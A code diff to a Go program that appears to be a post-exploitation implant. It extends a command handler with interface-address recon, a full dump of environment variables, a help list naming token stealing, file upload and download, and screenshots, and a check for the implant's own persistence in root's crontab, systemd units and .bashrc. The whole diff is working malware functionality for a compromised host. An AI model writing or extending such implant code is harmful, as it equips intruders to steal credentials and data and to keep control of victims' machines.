@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"net"
 	"os"
 	"os/user"
 	"runtime"
@@ -52,7 +53,17 @@ func handlePostex(cmd string) string {
 			name = u.Username
 		}
 		cwd, _ := os.Getwd()
-		return fmt.Sprintf("host=%s user=%s cwd=%s", host, name, cwd)
+		var addrs []string
+		ifaces, _ := net.Interfaces()
+		for _, i := range ifaces {
+			a, _ := i.Addrs()
+			for _, addr := range a {
+				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
+					addrs = append(addrs, ipnet.IP.String())
+				}
+			}
+		}
+		return fmt.Sprintf("host=%s user=%s cwd=%s addrs=%s", host, name, cwd, strings.Join(addrs, ","))
 	case strings.HasPrefix(op, "download:"):
 		path := strings.TrimPrefix(op, "download:")
 		info, err := os.Stat(path)
@@ -85,6 +96,18 @@ func handlePostex(cmd string) string {
 			return "Error: " + err.Error()
 		}
 		return fmt.Sprintf("uploaded %d bytes", len(data))
+	case op == "processes":
+		return handlePostex("__px:ps")
+	case op == "env":
+		var lines []string
+		for _, e := range os.Environ() {
+			lines = append(lines, e)
+		}
+		return strings.Join(lines, "\n")
+	case op == "help":
+		return "postex commands: ps, processes, recon, screenshot, env, download:<path>, upload:<path>:<b64>, persist_check, token:whoami, token:list, token:steal:<pid>"
+	case op == "persist_check":
+		return checkPersistence()
 	case op == "screenshot":
 		return captureScreenshot()
 	case strings.HasPrefix(op, "token:"):
@@ -92,4 +115,32 @@ func handlePostex(cmd string) string {
 	default:
 		return "Error: unknown postex op"
 	}
+}
+
+func checkPersistence() string {
+	var found []string
+	if runtime.GOOS == "linux" {
+		exe, _ := os.Executable()
+		crontab, err := os.ReadFile("/var/spool/cron/crontabs/root")
+		if err == nil && strings.Contains(string(crontab), exe) {
+			found = append(found, "crontab: "+exe)
+		}
+		for _, svc := range []string{"/etc/systemd/system/", "/lib/systemd/system/"} {
+			entries, _ := os.ReadDir(svc)
+			for _, e := range entries {
+				data, err := os.ReadFile(svc + e.Name())
+				if err == nil && strings.Contains(string(data), exe) {
+					found = append(found, "systemd: "+e.Name())
+				}
+			}
+		}
+		bashrc, _ := os.ReadFile(os.Getenv("HOME") + "/.bashrc")
+		if strings.Contains(string(bashrc), exe) {
+			found = append(found, "bashrc")
+		}
+	}
+	if len(found) == 0 {
+		return "No persistence mechanisms detected"
+	}
+	return "Persistence: " + strings.Join(found, ", ")
 }
